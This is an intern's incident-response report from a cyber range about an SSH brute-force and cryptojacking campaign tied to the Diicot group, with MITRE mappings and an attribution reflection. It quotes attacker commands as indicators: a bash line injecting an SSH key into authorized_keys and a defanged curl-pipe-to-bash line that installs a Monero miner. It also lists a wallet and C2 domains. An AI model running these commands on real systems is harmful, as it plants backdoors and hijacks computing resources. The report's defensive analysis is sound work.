•	Exploitation of Remote Services (T1210) https://attack.mitre.org/techniques/T1210/
•	SSH Hijacking (T1563.001) https://attack.mitre.org/techniques/T1563/001/
•	Resource Hijacking - Crypto Mining (T1496) https://attack.mitre.org/techniques/T1496/
•	Scheduled Task/Job - Cron (T1053.003) https://attack.mitre.org/techniques/T1053/003/
•	Command and Scripting Interpreter: Bash (T1059.004) https://attack.mitre.org/techniques/T1059/004/
•	Ingress Tool Transfer (T1105) https://attack.mitre.org/techniques/T1105/

MITRE DEFEND Framework https://defend.mitre.org/

•	Process Analysis (D3-PA) https://d3fend.mitre.org/technique/d3f:ProcessAnalysis/
•	Multi-Factor Authentication (D3-MFA) https://d3fend.mitre.org/technique/d3f:Multi-factorAuthentication/

VirusTotal Threat Intelligence https://www.virustotal.com/


Report Compiled By: Mohammed A, Analyst Intern Environment: Cyber Range Date: 23/03/2025
Mentor C Lead Instructor: Josh Madakor Case ID: Incident-2400
 
Post-Investigation Addendum – Threat Actor Context (Community-Based Discovery)
Note: This section was added after the original report was submitted. The content here reflects continued investigation and insights gained through post-report peer discussions, community research, and additional IOC discovery.
After completing my report, I reviewed two threat intelligence articles recommended by students in our community:
•	Akamai — Mexals Cryptojacking Malware Resurgence
•	Wiz.io — Diicot Threat Group Malware Campaign
Both reports highlight the Diicot threat group (also known as Mexals), which is known for running SSH brute-force attacks, cryptojacking campaigns, and using a variety of Linux miner payloads, matching much of the activity seen in this case.


Key Overlaps Between the Diicot Group and This Incident:
•	SSH brute-force attacks were used as an initial access vector — consistent with the
activity traced back to Sukal’s VM.
•	Miner payloads with names like .diicot, .balu, .kuak, and .retea — several of which were found in our payload analysis.
•	Use of curl/wget for remote payload retrieval and bash history wiping to evade detection.
•	Confirmed Monero (XMR) mining activity.
•	Overlapping C2 infrastructure — e.g., domains like dinpasiune[.]com and IP ranges similar to what was observed in this incident.
•	Use of UPX-packed ELF binaries and potentially TOR-like encrypted traffic — both patterns seen in our network and file analysis.
 
Analyst Reflection: Theory s Context
Initially, I was focused on the theory that a student — particularly the user behind the “Sukal” VM — had intentionally launched these attacks. This led to a degree of analytical tunnel vision, as I tried to fit observed behavior into a student-driven framework.
However, after reviewing broader threat intelligence and correlating known TTPs, I realized that this activity was more consistent with the Diicot group’s operational patterns. While it’s still possible the student was involved — either by knowingly using public tools or having their system compromised — the evidence suggests a more likely connection to an established external threat actor.
This realization served as a valuable learning moment about maintaining investigative flexibility and avoiding early confirmation bias during threat attribution.
Intern Note:
Brute-force attacks can appear noisy or unsophisticated, which initially made it seem unlikely that a serious actor was behind this activity. However, brute-force is a core technique used by groups like Diicot, who favor mass-scanning campaigns and opportunistic access — especially in lab environments or systems with weak protections.
This context doesn’t change the core findings of the report but adds important external
perspective and may help guide future detections and incident response improvements.
 
Additional Findings After Initial Report
Malicious SSH RSA Key Injection s Crypto Wallets

SSH Public Key injected into .ssh/authorized_keys

Malicious SSH Public Key Found
ssh-rsa
bash -c "LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4a NT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yM kZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O45 4ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBb  tdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8q W4Ku7dySZ4yvH >>~/.ssh/authorized_keys"
 
Purpose:
This SSH RSA public key was used by the attacker to establish persistent, passwordless remote access across compromised Linux VMs.
The key was injected repeatedly into the following locations:
•	/root/.ssh/authorized_keys
•	~/.ssh/authorized_keys
Observed Behavior:
•	Deployed via scripted bash -c "echo ssh-rsa ... >> ~/.ssh/authorized_keys"
•	Found identical on multiple VMs (indicates botnet-style operation)
•	Not rotated or unique per host (typical of automated crypto-mining campaigns)
•	Repeated same RSA key injected into multiple Azure Linux VMs.
•	Use of both ~/.ssh/authorized_keys and /root/.ssh/authorized_keys.
•	Repeated bash command structure matching attacker playbook.
•	Persistent SSH Access for potential lateral movement or mining.
•	Bypasses traditional SSH password policies via key injection.

MITRE ATTCCK Mapping:

Tactic	Technique	Description
Persistence	T1098 - Account
Manipulation	SSH key injection for backdoor access
Defense
Evasion	T1070.004 - Indicator
Removal	Silent modification
of .ssh/authorized_keys
 
Affected VM Targets with .ssh/authorized keys Modification:

 
Outcome / IOC Lock-in:
•	15+ VMs compromised via SSH authorized_keys injection.
•	Attackers used /root/.ssh/authorized_keys and user-level paths
/home/*/.ssh/authorized_keys
•	All listed above added to the IOC list for playbook documentation
Real Patient Zero from Initial Report



 
 


 
 
 
 
 
 
 
 

 
Crypto-Mining C3Pool and UPX Variants
Found in logs using Defender for Endpoint:
Sample File Names:
•	upxvmyizov
•	efzkrhkupx
•	pjmupxbstu
Related Tools C Indicators:
•	upxvmyizov: Fake UPX binary mimicking command-line tools (netstat, ls, echo, ifconfig, sh)
•	Custom binary chains:
•	/usr/bin/upxvmyizov netstat -an
/usr/bin/upxvmyizov echo "find"
./ygljglkjgfg0 (obfuscated ELF payload)

 
 
Confirmed Wallet Identified
•	Wallet Address (C3Pool miner):
4B7vD4PrcGdES1grKPBH5jbsh4SgknSzkFFRHxWMqux7bJrieQoawCiFnd36wKTPtAUXJLeQ    BZWKRKza7qJaQscx2kCCrZo
Detected:
Feb 23, 2025 — Host: linux-vuln-test-jonz — User: root
Method:
Mining script fetched and executed:
curl -s -L hxxp://download[.]c3pool[.]org/xmrig_setup/raw/master/setup_c3pool_miner[.]sh | bash - s <WALLET>
 
Mining Earnings


Summary of Findings
This wallet is used with C3Pool miner.
We checked the mining dashboard using the wallet address and found:
•	Total paid: 20.77 XMR
•	Unpaid balance: 0.016 XMR
•	Total mined: around 20.78 XMR (worth about $2,800 USD)
